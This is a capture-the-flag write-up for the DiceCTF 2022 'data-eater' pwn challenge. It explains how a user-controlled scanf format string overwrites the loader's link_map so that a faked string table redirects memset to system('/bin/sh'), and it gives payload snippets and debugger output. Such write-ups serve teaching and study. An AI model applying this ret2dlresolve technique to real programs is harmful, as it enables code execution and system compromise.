# Is FSB still vulnerable with scanf: Data-eater

- Challenge Authors : KyleForkBomb
- Tag : pwn, fsb, ret2dl, rop
- Points : 220 (25 solves)
- Difficulty : medium

### Challenge Description

> nom nom nom! i can eat all kinds of data :D
> 

I tried to solve this problem in Dice CTF 2022, but I couldn't solve it in the competition, but I tried it again because I thought it would be helpful after seeing the Writeup.

I referenced this writeup, and paper of UseNIX Security about ret2dlresolve

[https://github.com/nhtri2003gmail/writeup-ctf.dicega.ng-dataeater](https://github.com/nhtri2003gmail/writeup-ctf.dicega.ng-dataeater)

[https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-di-frederico.pdf](https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-di-frederico.pdf)

I recommend to read above paper if you don’t know ret2dlresolve detail. Because paper is very detailed about ELF security.

Let’s go!! ▶️

If we unzip challenge file we can only get a ELF executable file `dataeater` 

## 1. Analysis

We can see file information with `file` command

```html
dataeater: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=a3e6d6f42869e6785a5d3815426a76137ac581e1, not stripped
```

We know this binary is 64-bit not stripped file, so we can identify symbols of binary

Let’s see file mitigation!!

```html
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

There is no pie, partial RELRO ⇒ In this challenge this feature will be used

Now let's take a look at the flow of the program with IDA Pro.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  const char **v3; // rax
  const char **v4; // rax
  char s[8]; // [rsp+20h] [rbp-10h] BYREF
  unsigned __int64 v9; // [rsp+28h] [rbp-8h]

  v9 = __readfsqword(0x28u);
  while ( *argv )
  {
    v3 = argv++;
    *v3 = 0LL;
  }
  while ( *envp )
  {
    v4 = envp++;
    *v4 = 0LL;
  }
  fgets(s, 8, stdin);
  __isoc99_scanf(s, &buf);
  memset(&buf, 0, 0x20uLL);
  MEMORY[0] = 0;
  return 0;
}
```

We can see first program receive **8 bytes data for format string used by scanf**

so we can control scanf’s format string

After scanf, memset our global variable, program crash itself

So How we use this vulnerability?

## 2. Exploit

Before exploit, We have to know `lazy binding`, `link_map` structure, `DT_STRTAB`

First, We have to know `link_map` pointer usually in stack. I assume that in lazy binding, `link_map` and `reloc_offset` is pushed to resolve library function. so I think when `__libc_start_main@plt`  called, link_map’s address is pushed

so If we make format string like `%s%<linkmap_offset>$s` we can overwrite `buf` and `link_map` in loader memory. and if we change `link_map` values, we can control `memset's lazy binding`process!!

```python
payload = b'%s%32$s' ## this 32 value will be known by gdb or brute force for remote environment

p.sendline(payload)
```

Let’s see `link_map` & `dl_fixup`

[link_map](https://code.woboq.org/userspace/glibc/include/link.h.html#92):

```c
struct link_map
{
    Elf64_Addr l_addr;
    char *l_name;
    Elf64_Dyn *l_ld;
    struct link_map *l_next, *l_prev;
    struct link_map *l_real;
    Lmid_t l_ns;
    struct libname_list *l_libname;
    Elf64_Dyn l_info[77]
    ...
}
```

[dl_fixup](https://code.woboq.org/userspace/glibc/elf/dl-runtime.c.html#59):

```c
1  |_dl_fixup (
2  |# ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS
3  |            ELF_MACHINE_RUNTIME_FIXUP_ARGS,
4  |# endif
5  |            struct link_map *l, ElfW(Word) reloc_arg)
6  |{
7  |    const ElfW(Sym) *const symtab = (const void *) D_PTR (l, l_info[DT_SYMTAB]);
8  |    const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);
9  |    
10 |    const PLTREL *const reloc = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);
11 |    const ElfW(Sym) *sym = &symtab[ELFW(R_SYM) (reloc->r_info)];
12 |    const ElfW(Sym) *refsym = sym;
13 |    void *const rel_addr = (void *)(l->l_addr + reloc->r_offset);
14 |    lookup_t result;
15 |    DL_FIXUP_VALUE_TYPE value;
16 |    
17 |    /* Sanity check that we're really looking at a PLT relocation.  */
18 |       assert (ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT);
19 |    
20 |    /* Look up the target symbol.  If the normal lookup rules are not
21 |       used don't look in the global scope.  */
.. |    ...
89 |}
```

[DT_* constant](https://code.woboq.org/userspace/glibc/elf/elf.h.html#853) value which is used by `dl_fixup`:

```c
# define DT_STRTAB        5  // we will use this value
# define DT_SYMTAB        6
# define DT_JMPREL        23
```

Above code and paper about ret2dlresolve, we can know there is two ways to hijack control flow from abusing lazy binding process

1. control reloc_offset variable by ROP ⇒ make Fake ELF64_Rela, ELF64_SYM strucre in bss or writeable memory ⇒ execute arbitary function
2. control l_info[DT_STRTAB] in link_map which value is pointer of .dynamic section which has value of elf string table section address and make fake string table in writable memory  ⇒ so lazy binding process will be mistaken string table ⇒ execute arbitary function

We will use 2nd approach by overwrite until `l_info[DT_STRTAB]` 

```python
link_map = p64(0) * 13 # we have to see this offset everytime
link_map += p64(elf.sym['buf'] + 8)[:-1]
```

So we can abuse that lazy binding system see our `buf+8` as .dynamic section which has string table address.

this is real .dynamic section

```python
gef➤  # x/50xg linkmap
gef➤  x/50xg 0x00007ffff7ffe180
0x7ffff7ffe180:    0x0000000000000000    0x00007ffff7ffe720
0x7ffff7ffe190:    0x0000000000600e20    0x00007ffff7ffe730
0x7ffff7ffe1a0:    0x0000000000000000    0x00007ffff7ffe180
0x7ffff7ffe1b0:    0x0000000000000000    0x00007ffff7ffe708
0x7ffff7ffe1c0:    0x0000000000000000    0x0000000000600e20    <-- l_info at 0x7ffff7ffe1c0
0x7ffff7ffe1d0:    0x0000000000600f00    0x0000000000600ef0
0x7ffff7ffe1e0:    0x0000000000000000    0x0000000000600ea0    <-- l_info[5] = 0x0000000000600ea0
0x7ffff7ffe1f0:    0x0000000000600eb0    0x0000000000600f30
0x7ffff7ffe200:    0x0000000000600f40    0x0000000000600f50

gef➤  # x/2xg l_info[DT_STRTAB] = l_info[5]
gef➤  x/2xg 0x0000000000600ea0
0x600ea0:    0x0000000000000005    0x0000000000400380        <-- STRTAB
```

we abuse 0x600ea0 → &(buf + 8), and make *(buf + 16) = &buf

and originally memset string location in .dynstr is 55. so we write “system” in &(buf + 55)

```python
buf_data = fit({
        0: b"/bin/sh\x00",
        8: flat(5, elf.sym['buf']),
        55: b'system\x00'
        }, filler = b"\x00")
```

then we can get shell!!

I think this challenge is very instructive, and thanks to this challenge and nice writeup with paper!! In the process of trying to understand writeup, I also read a paper, so I learned a lot about ELF.
